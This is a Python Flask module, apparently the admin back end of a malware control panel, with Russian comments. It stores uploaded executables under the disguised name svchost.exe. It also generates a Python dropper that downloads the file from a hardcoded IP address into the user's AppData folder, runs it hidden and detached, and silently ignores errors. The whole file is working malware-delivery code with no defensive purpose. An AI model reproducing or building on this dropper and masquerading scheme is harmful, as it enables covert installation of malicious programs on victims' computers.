import os
import subprocess
import tempfile
import shutil
from flask import request, jsonify, send_file, render_template, redirect, url_for, session
from models import db, AgentBuild
from datetime import datetime
from functools import wraps
from io import BytesIO

BUILDS_DIR = os.path.join(os.path.dirname(__file__), 'static', 'builds')
os.makedirs(BUILDS_DIR, exist_ok=True)

def session_admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated_function

def register_builder_routes(app, admin_required):

    @app.route('/admin/agentbuild/', methods=['GET'])
    @session_admin_required
    def agentbuild_list():
        return render_template('admin/agent_builds_list.html')

    @app.route('/admin/agentbuild/create', methods=['GET', 'POST'])
    @session_admin_required
    def agentbuild_create():
        if request.method == 'POST':
            return redirect(url_for('upload_and_build_agent'))
        return render_template('admin/agentbuild_create.html',
                             form={'hidden_tag': lambda: ''},
                             return_url=url_for('agentbuild_list'))

    @app.route('/admin/agentbuild/upload', methods=['POST'])
    @session_admin_required
    def upload_and_build_agent():
        if 'agent_file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400

        file = request.files['agent_file']
        if not file.filename.endswith('.exe'):
            return jsonify({'error': 'Only .exe files allowed'}), 400

        # Создаем запись в БД
        build = AgentBuild(
            filename='pending',
            original_filename=file.filename,
            file_path='pending',
            file_size=0,
            download_url='',
            status='processing',
            created_by=1  # TODO: get from session
        )
        db.session.add(build)
        db.session.commit()

        try:
            # Сохраняем загруженный .exe файл
            final_path = os.path.join(BUILDS_DIR, f'svchost_{build.id}.exe')
            file.save(final_path)

            # Обновляем запись
            build.filename = f'svchost_{build.id}.exe'
            build.file_path = final_path
            build.file_size = os.path.getsize(final_path)
            build.download_url = f'/static/builds/svchost_{build.id}.exe'
            build.status = 'ready'
            db.session.commit()

            return jsonify({
                'success': True,
                'build_id': build.id,
                'download_url': build.download_url
            }), 200

        except Exception as e:
            build.status = 'failed'
            build.error_message = str(e)
            db.session.commit()
            return jsonify({'error': str(e)}), 500

    @app.route('/admin/agentbuild/loader/<int:build_id>', methods=['POST'])
    @session_admin_required
    def build_loader(build_id):
        build = AgentBuild.query.get_or_404(build_id)
        if build.status != 'ready':
            return jsonify({'error': 'Agent build not ready'}), 400

        loader_name = request.json.get('loader_name', 'installer')

        # Создаем loader скрипт
        loader_code = f'''import os
import urllib.request
import subprocess
import sys

def download_and_run():
    try:
        url = "http://141.147.45.169:5000{build.download_url}"

        # Определяем путь для сохранения
        appdata = os.environ.get("APPDATA")
        target_dir = os.path.join(appdata, "Microsoft", "Windows")
        os.makedirs(target_dir, exist_ok=True)

        target_path = os.path.join(target_dir, "svchost.exe")

        # Скачиваем файл
        urllib.request.urlretrieve(url, target_path)

        # Запускаем в фоне
        if sys.platform == "win32":
            subprocess.Popen([target_path],
                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                           close_fds=True)
        else:
            subprocess.Popen([target_path],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           close_fds=True)
    except Exception as e:
        pass  # Тихо игнорируем ошибки

if __name__ == "__main__":
    download_and_run()
'''

        try:
            # Отправляем loader как Python скрипт для локальной компиляции
            from io import BytesIO
            loader_bytes = BytesIO(loader_code.encode('utf-8'))
            loader_bytes.seek(0)

            return send_file(loader_bytes,
                           as_attachment=True,
                           download_name=f'{loader_name}.py',
                           mimetype='text/x-python')

        except Exception as e:
            return jsonify({'error': str(e)}), 500

    @app.route('/admin/agentbuild/list', methods=['GET'])
    @session_admin_required
    def list_builds():
        builds = AgentBuild.query.order_by(AgentBuild.created_at.desc()).all()
        return jsonify([{
            'id': b.id,
            'original_filename': b.original_filename,
            'filename': b.filename,
            'status': b.status,
            'file_size': b.file_size,
            'download_url': b.download_url,
            'error_message': b.error_message,
            'created_at': b.created_at.isoformat() if b.created_at else None
        } for b in builds]), 200

    @app.route('/admin/agentbuild/download/<int:build_id>', methods=['GET'])
    @session_admin_required
    def download_build_agent(build_id):
        build = AgentBuild.query.get_or_404(build_id)
        if build.status != 'ready':
            return jsonify({'error': 'Build not ready'}), 400

        return send_file(build.file_path,
                        as_attachment=True,
                        download_name='svchost.exe',
                        mimetype='application/octet-stream')
